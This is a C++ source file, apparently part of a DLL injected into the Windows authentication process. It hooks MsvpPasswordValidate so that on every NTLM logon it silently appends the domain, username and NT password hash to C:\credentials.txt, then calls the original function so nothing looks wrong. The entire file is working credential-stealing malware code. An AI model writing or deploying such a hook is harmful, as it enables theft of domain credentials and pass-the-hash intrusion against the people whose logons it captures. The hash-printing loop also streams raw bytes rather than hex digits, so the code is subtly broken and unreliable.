#include "pch.h"
#include "hppdll.h"

BOOLEAN HookMSVPPValidate(BOOLEAN UasCompatibilityRequired, NETLOGON_LOGON_INFO_CLASS LogonLevel, PVOID LogonInformation, void* Passwords, PULONG UserFlags, PUSER_SESSION_KEY UserSessionKey, PVOID LmSessionKey)
{
	DEBUG("Hook called!");
	// cast LogonInformation to NETLOGON_LOGON_IDENTITY_INFO pointer
	NETLOGON_LOGON_IDENTITY_INFO* logonIdentity = (NETLOGON_LOGON_IDENTITY_INFO*)LogonInformation;

	// write to C:\credentials.txt the domain, username and NT hash of the target user
	std::wofstream credentialFile;
	credentialFile.open("C:\\credentials.txt", std::fstream::in | std::fstream::out | std::fstream::app);
	credentialFile << L"Domain: " << logonIdentity->LogonDomainName.Buffer << std::endl;
	std::wstring username;
	
	// LogonIdentity->Username.Buffer contains more stuff than the username
	// so we only get the username by iterating on it only Length/2 times 
	// (Length is expressed in bytes, unicode strings take two bytes per character)
	for (int i = 0; i < logonIdentity->UserName.Length/2; i++)
	{
		username += logonIdentity->UserName.Buffer[i];
	}
	credentialFile << L"Username: " << username << std::endl;
	credentialFile << L"NTHash: ";
	for (int i = 0; i < 16; i++)
	{
		unsigned char hashByte = ((unsigned char*)Passwords)[i];
		credentialFile << std::hex << hashByte;
	}
	credentialFile << std::endl;
	credentialFile.close();

	DEBUG("Hook successfully called!");
	return MsvpPasswordValidate(UasCompatibilityRequired, LogonLevel, LogonInformation, Passwords, UserFlags, UserSessionKey, LmSessionKey);
}